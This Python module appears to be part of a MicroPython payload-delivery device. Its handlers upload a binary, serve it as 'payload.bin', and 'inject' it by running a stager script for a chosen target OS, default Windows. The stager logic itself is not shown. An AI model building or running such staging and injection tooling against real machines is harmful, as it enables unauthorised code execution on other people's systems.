import gc
import json
import os

from .constants import _FILE_CHUNK_SIZE, _PAYLOAD_BIN
from .micro_server import Response


async def serve_payload(portal, request):
    try:
        fstat = os.stat(_PAYLOAD_BIN)
        file_size = fstat[6]
    except OSError:
        return portal._json_response({'message': 'No payload staged.'}, 404)

    def _chunks():
        try:
            with open(_PAYLOAD_BIN, 'rb') as fh:
                while True:
                    chunk = fh.read(_FILE_CHUNK_SIZE)
                    if not chunk:
                        break
                    yield chunk
        except OSError:
            pass

    return Response(
        _chunks(),  # type: ignore
        200,
        headers={
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': 'attachment; filename="payload.bin"',
            'Content-Length': str(file_size),
            'X-Content-Type-Options': 'nosniff',
        },
    )


async def upload_binary(portal, request):
    content_length = int(request.headers.get('Content-Length', 0) or 0)
    if not content_length:
        return portal._json_response({'message': 'No content received.', 'notice': 'error'}, 400)

    written = 0
    try:
        portal._ensure_static_dir()
        gc.collect()
        with open(_PAYLOAD_BIN, 'wb') as f:
            if request.body:
                f.write(request.body)
                written = len(request.body)
            elif request.stream is not None:
                remaining = content_length
                while remaining > 0:
                    chunk = await request.stream.read(min(_FILE_CHUNK_SIZE, remaining))
                    if not chunk:
                        break
                    f.write(chunk)
                    written += len(chunk)
                    remaining -= len(chunk)
    except (OSError, MemoryError):
        return portal._json_response(
            {'message': 'Write failed. Check available flash space.', 'notice': 'error'}, 500
        )

    fname = request.headers.get('X-Filename', 'payload.bin')
    return portal._json_response(
        {
            'message': f'Binary uploaded ({written} bytes).',
            'notice': 'success',
            'size': written,
            'filename': fname,
        }
    )


async def inject_binary(portal, request):
    if not portal._has_binary():
        return portal._json_response({'message': 'No binary uploaded yet.', 'notice': 'error'}, 404)
    try:
        data = json.loads((request.body or b'').decode('utf-8', 'ignore') or '{}')
    except ValueError:
        data = {}
    target_os = str(data.get('os', 'windows')).lower()
    script = portal._stager_script(target_os)
    message, notice = await portal._run_payload(script)
    status = 200 if notice == 'success' else 400
    return portal._json_response(
        {'message': message, 'notice': notice, 'run_history': portal._recent_runs()}, status
    )
